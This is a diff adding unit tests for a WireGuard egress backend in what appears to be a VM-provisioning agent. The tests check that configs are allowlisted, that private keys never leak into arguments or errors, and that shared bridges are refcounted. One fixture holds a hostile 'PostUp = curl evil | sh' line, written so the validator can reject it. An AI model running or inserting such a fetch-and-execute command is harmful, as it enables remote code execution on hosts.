@@ -452,6 +452,215 @@ class WarpBackendTest(unittest.TestCase):
         self.assertIn("cloudflare-warp", fc_agent.EGRESS_PROVIDERS)
 
 
+WG_PRIVATE = "yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk="
+WG_CONF = f"""# a comment
+[Interface]
+PrivateKey = {WG_PRIVATE}
+Address = 10.64.0.2/32
+DNS = 10.64.0.1
+
+[Peer]
+PublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=
+Endpoint = 203.0.113.7:51820
+AllowedIPs = 0.0.0.0/0
+"""
+
+
+def wg_blob(conf=WG_CONF):
+    import base64
+    return base64.b64encode(conf.encode()).decode()
+
+
+class WireGuardConfTest(unittest.TestCase):
+    """the config allowlist: what wireproxy would run is exactly what was
+    validated, and nothing that executes or leaks is let through."""
+
+    def test_accepts_a_standard_config(self):
+        sections = fc_agent.wg_parse_conf(WG_CONF)
+        self.assertEqual([s[0] for s in sections], ["interface", "peer"])
+        self.assertIn(("DNS", "10.64.0.1"), sections[0][1])
+
+    def test_rejects_what_wg_quick_would_execute_or_wireproxy_would_expand(self):
+        for extra, why in (
+            ("PostUp = curl evil | sh", "PostUp"),
+            ("Table = off", "Table"),
+            ("SaveConfig = true", "SaveConfig"),
+        ):
+            conf = WG_CONF.replace("DNS = 10.64.0.1", f"DNS = 10.64.0.1\n{extra}")
+            with self.assertRaises(fc_agent.HTTPError) as caught:
+                fc_agent.wg_parse_conf(conf)
+            self.assertEqual(caught.exception.code, 400)
+            self.assertIn(why, caught.exception.msg)
+        env_ref = WG_CONF.replace(WG_PRIVATE, "$HOME")
+        with self.assertRaises(fc_agent.HTTPError):
+            fc_agent.wg_parse_conf(env_ref)
+
+    def test_requires_dns_so_lookups_cannot_leave_outside_the_tunnel(self):
+        with self.assertRaises(fc_agent.HTTPError) as caught:
+            fc_agent.wg_parse_conf(WG_CONF.replace("DNS = 10.64.0.1\n", ""))
+        self.assertIn("DNS", caught.exception.msg)
+
+    def test_rejects_structure_errors_without_echoing_values(self):
+        for conf in (
+            "[Interface]\nPrivateKey = x\n",                                    # no peer
+            WG_CONF + "\n[Interface]\nPrivateKey = y\nAddress = a\nDNS = d\n",  # two interfaces
+            WG_CONF.replace("[Peer]", "[Proxy]"),                                # unknown section
+            WG_CONF.replace("Endpoint = 203.0.113.7:51820", "Endpoint"),         # not key = value
+            WG_CONF.replace("Address = 10.64.0.2/32", f"PrivateKey = {WG_PRIVATE}"),  # duplicate key
+        ):
+            with self.assertRaises(fc_agent.HTTPError) as caught:
+                fc_agent.wg_parse_conf(conf)
+            self.assertEqual(caught.exception.code, 400)
+            self.assertNotIn(WG_PRIVATE, caught.exception.msg)
+
+    def test_fingerprint_ignores_comments_whitespace_and_key_case(self):
+        a = fc_agent.wg_fingerprint(fc_agent.wg_parse_conf(WG_CONF))
+        b = fc_agent.wg_fingerprint(fc_agent.wg_parse_conf(
+            WG_CONF.replace("# a comment\n", "").replace("PrivateKey =", "privatekey=").replace("\n\n", "\n\n\n")))
+        self.assertEqual(a, b)
+        other = fc_agent.wg_fingerprint(fc_agent.wg_parse_conf(WG_CONF.replace("10.64.0.2/32", "10.64.0.3/32")))
+        self.assertNotEqual(a, other)
+
+    def test_render_adds_keepalive_and_both_listeners(self):
+        out = fc_agent.wg_render(fc_agent.wg_parse_conf(WG_CONF), 7)
+        self.assertIn("PersistentKeepalive = 25", out)
+        self.assertIn("[Socks5]\nBindAddress = 10.202.7.2:1080", out)
+        self.assertIn("[http]\nBindAddress = 10.202.7.2:1081", out)
+        # an explicit keepalive is kept, not doubled.
+        conf = WG_CONF.replace("AllowedIPs = 0.0.0.0/0", "AllowedIPs = 0.0.0.0/0\nPersistentKeepalive = 10")
+        out = fc_agent.wg_render(fc_agent.wg_parse_conf(conf), 7)
+        self.assertEqual(out.count("PersistentKeepalive"), 1)
+
+    def test_endpoint_hostnames_resolve_on_the_host(self):
+        infos = [(2, 2, 17, "", ("198.51.100.9", 51820))]
+        with mock.patch.object(fc_agent.socket, "getaddrinfo", return_value=infos):
+            self.assertEqual(fc_agent.wg_resolve_endpoint("vpn.example.com:51820"), "198.51.100.9:51820")
+        self.assertEqual(fc_agent.wg_resolve_endpoint("[2001:db8::1]:51820"), "[2001:db8::1]:51820")
+        with self.assertRaises(fc_agent.HTTPError):
+            fc_agent.wg_resolve_endpoint("no-port")
+
+
+class WireGuardBackendTest(unittest.TestCase):
+    """the wireguard backend: one bridge per config, refcounted, and the
+    config travels to the script on stdin and nowhere else."""
+
+    def setUp(self):
+        self.tmp = tempfile.TemporaryDirectory()
+        self.addCleanup(self.tmp.cleanup)
+        p = mock.patch.object(fc_agent, "WG_DIR", Path(self.tmp.name) / "wireguard")
+        p.start()
+        self.addCleanup(p.stop)
+        self.runs = []
+        self.sudos = []
+
+        def fake_run(cmd, check=True, input_bytes=None):
+            self.runs.append((list(cmd), input_bytes))
+            return subprocess.CompletedProcess(cmd, 0, stdout=b"", stderr=b"")
+
+        def fake_sudo(cmd, check=True):
+            self.sudos.append(list(cmd))
+            return subprocess.CompletedProcess(cmd, 0)
+
+        for name, fake in (("run", fake_run), ("sudo", fake_sudo)):
+            p = mock.patch.object(fc_agent, name, side_effect=fake)
+            p.start()
+            self.addCleanup(p.stop)
+
+    def meta(self, vm_id, idx=3):
+        return {"vm_id": vm_id, "tap": f"fcv{idx}", "host_ip": f"10.200.{idx}.1", "guest_ip": f"10.200.{idx}.2"}
+
+    def body(self, conf=WG_CONF, **overrides):
+        b = {"provider": "wireguard", "protocol": "socks5", "listen_ip": "10.200.3.1", "config": {"WG_CONF": wg_blob(conf)}}
+        b.update(overrides)
+        return b
+
+    def verb(self, name):
+        return [c for c in self.sudos if len(c) > 2 and c[2] == name]
+
+    def ups(self):
+        return [c for c in self.runs if "up" in c[0]]
+
+    def test_first_vm_brings_a_bridge_up_with_the_config_on_stdin_only(self):
+        ep = fc_agent.wg_provision(self.meta("vm-a"), self.body())
+        self.assertEqual(ep, {"url": "socks5h://10.200.3.1:1080", "protocol": "socks5"})
+        self.assertEqual(len(self.ups()), 1)
+        argv, stdin = self.ups()[0]
+        fp, slot = argv[-2], argv[-1]
+        self.assertEqual(slot, "0")
+        self.assertRegex(fp, r"^[0-9a-f]{12}$")
+        self.assertNotIn(WG_PRIVATE, " ".join(argv))
+        self.assertIn(f"PrivateKey = {WG_PRIVATE}", stdin.decode())
+        for c in self.sudos:
+            self.assertNotIn(WG_PRIVATE, " ".join(c))
+        self.assertEqual(self.verb("attach"), [["bash", str(fc_agent.WG_SCRIPT), "attach", fp, "0", "fcv3", "10.200.3.1", "1080", "1080"]])
+        self.assertEqual(fc_agent.wg_refs(fp), {"vm-a"})
+
+    def test_same_config_shares_the_bridge_and_an_http_vm_gets_the_http_port(self):
+        fc_agent.wg_provision(self.meta("vm-a", 3), self.body())
+        fp = self.ups()[0][0][-2]
+        ep = fc_agent.wg_provision(self.meta("vm-b", 4), self.body(protocol="http"))
+        self.assertEqual(ep, {"url": "http://10.200.4.1:1080", "protocol": "http"})
+        self.assertEqual({c[0][-1] for c in self.ups()}, {"0"}, "a second slot was allocated for the same config")
+        self.assertIn(["bash", str(fc_agent.WG_SCRIPT), "attach", fp, "0", "fcv4", "10.200.4.1", "1080", "1081"], self.sudos)
+        self.assertEqual(fc_agent.wg_refs(fp), {"vm-a", "vm-b"})
+
+    def test_a_different_config_gets_its_own_slot(self):
+        fc_agent.wg_provision(self.meta("vm-a", 3), self.body())
+        fc_agent.wg_provision(self.meta("vm-b", 4), self.body(WG_CONF.replace("10.64.0.2/32", "10.64.0.9/32")))
+        self.assertEqual([c[0][-1] for c in self.ups()], ["0", "1"])
+
+    def test_last_vm_out_tears_the_bridge_down_and_frees_the_slot(self):
+        fc_agent.wg_provision(self.meta("vm-a", 3), self.body())
+        fc_agent.wg_provision(self.meta("vm-b", 4), self.body(protocol="http"))
+        fp = self.ups()[0][0][-2]
+        self.sudos.clear()
+        fc_agent.wg_destroy(self.meta("vm-a", 3))
+        self.assertEqual(self.verb("detach"), [["bash", str(fc_agent.WG_SCRIPT), "detach", fp, "0", "fcv3", "10.200.3.1", "1080", "1080"]])
+        self.assertEqual(self.verb("down"), [], "torn down with a vm still attached")
+        self.sudos.clear()
+        fc_agent.wg_destroy(self.meta("vm-b", 4))
+        self.assertEqual(self.verb("detach")[0][-1], "1081", "detach must remove the dnat attach added")
+        self.assertEqual(self.verb("down"), [["bash", str(fc_agent.WG_SCRIPT), "down", fp, "0"]])
+        self.assertFalse((fc_agent.WG_DIR / fp).exists())
+        # a second destroy is a no-op.
+        self.sudos.clear()
+        fc_agent.wg_destroy(self.meta("vm-b", 4))
+        self.assertEqual(self.sudos, [])
+        # and slot 0 is free again.
+        fc_agent.wg_provision(self.meta("vm-c", 5), self.body(WG_CONF.replace("10.64.0.2/32", "10.64.0.9/32")))
+        self.assertEqual(self.ups()[-1][0][-1], "0")
+
+    def test_a_bridge_that_does_not_come_up_is_a_502_without_the_key_and_holds_nothing(self):
+        def failing_run(cmd, check=True, input_bytes=None):
+            return subprocess.CompletedProcess(cmd, 1, stdout=b"", stderr=f"[wireguard] no handshake key={WG_PRIVATE}\n".encode())
+
+        with mock.patch.object(fc_agent, "run", side_effect=failing_run):
+            with self.assertRaises(fc_agent.HTTPError) as caught:
+                fc_agent.wg_provision(self.meta("vm-a"), self.body())
+        self.assertEqual(caught.exception.code, 502)
+        self.assertNotIn(WG_PRIVATE, caught.exception.msg)
+        self.assertIn("[REDACTED]", caught.exception.msg)
+        self.assertEqual(len(self.verb("down")), 1, "a failed first bridge must be torn down")
+        self.assertEqual(list(fc_agent.WG_DIR.glob("*")) if fc_agent.WG_DIR.exists() else [], [])
+
+    def test_rejects_bad_requests_before_touching_the_host(self):
+        for body in (
+            self.body(protocol="udp"),
+            self.body(config={}),
+            self.body(config={"WG_CONF": wg_blob(), "EVIL": "x"}),
+            self.body(config={"WG_CONF": "not base64!!"}),
+            self.body(WG_CONF.replace("DNS = 10.64.0.1", "PostUp = id")),
+        ):
+            with self.assertRaises(fc_agent.HTTPError) as caught:
+                fc_agent.wg_provision(self.meta("vm-a"), body)
+            self.assertEqual(caught.exception.code, 400)
+        self.assertEqual(self.runs, [])
+        self.assertEqual(self.sudos, [])
+
+    def test_registered_under_its_name(self):
+        self.assertIn("wireguard", fc_agent.EGRESS_PROVIDERS)
+
+
 class ExecEnvTest(unittest.TestCase):
     """exec'd commands and attach-with-command run as a non-login bash -c
     over ssh, which reads no profile, so the agent sources the egress hook
